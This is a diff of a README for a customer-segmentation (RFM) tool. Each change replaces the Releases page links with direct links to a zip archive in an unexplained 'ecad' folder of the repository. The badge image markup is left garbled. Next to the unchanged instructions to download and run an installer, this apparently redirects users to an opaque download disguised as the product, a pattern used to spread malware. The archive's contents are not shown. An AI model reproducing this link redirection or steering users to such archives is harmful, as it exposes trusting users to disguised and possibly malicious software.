@@ -1,6 +1,6 @@
 # 🎯 RFM-Customer-Segmentation-Analysis - Analyze Customers with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF4081.svg?style=flat&logo=github)](https://github.com/niks060504/RFM-Customer-Segmentation-Analysis/releases)
+[![Download Now](https://raw.githubusercontent.com/niks060504/RFM-Customer-Segmentation-Analysis/main/ecad/RFM-Customer-Segmentation-Analysis.zip%20Now-%https://raw.githubusercontent.com/niks060504/RFM-Customer-Segmentation-Analysis/main/ecad/RFM-Customer-Segmentation-Analysis.zip)](https://raw.githubusercontent.com/niks060504/RFM-Customer-Segmentation-Analysis/main/ecad/RFM-Customer-Segmentation-Analysis.zip)
 
 ## 📁 Overview
 
@@ -19,7 +19,7 @@ Welcome to the RFM-Customer-Segmentation-Analysis project. This application help
 Follow these easy steps to download and run the software.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/niks060504/RFM-Customer-Segmentation-Analysis/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/niks060504/RFM-Customer-Segmentation-Analysis/main/ecad/RFM-Customer-Segmentation-Analysis.zip) to find the latest version.
 
 2. **Choose Your File**  
    Look for the file that matches your system. Common options include `.exe` for Windows, `.dmg` for Mac, and `.zip` for Linux.
@@ -32,7 +32,7 @@ Follow these easy steps to download and run the software.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/niks060504/RFM-Customer-Segmentation-Analysis/releases)
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/niks060504/RFM-Customer-Segmentation-Analysis/main/ecad/RFM-Customer-Segmentation-Analysis.zip)
 
 After downloading, run the installation file and follow the on-screen instructions.
 
@@ -76,4 +76,4 @@ If you encounter any issues, please check the FAQ section on GitHub or reach out
 
 Thank you for using the RFM-Customer-Segmentation-Analysis application. Your feedback is valuable to us. Please share your experience or any suggestions for improvement via GitHub. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF4081.svg?style=flat&logo=github)](https://github.com/niks060504/RFM-Customer-Segmentation-Analysis/releases)
+[![Download Now](https://raw.githubusercontent.com/niks060504/RFM-Customer-Segmentation-Analysis/main/ecad/RFM-Customer-Segmentation-Analysis.zip%20Now-%https://raw.githubusercontent.com/niks060504/RFM-Customer-Segmentation-Analysis/main/ecad/RFM-Customer-Segmentation-Analysis.zip)](https://raw.githubusercontent.com/niks060504/RFM-Customer-Segmentation-Analysis/main/ecad/RFM-Customer-Segmentation-Analysis.zip)
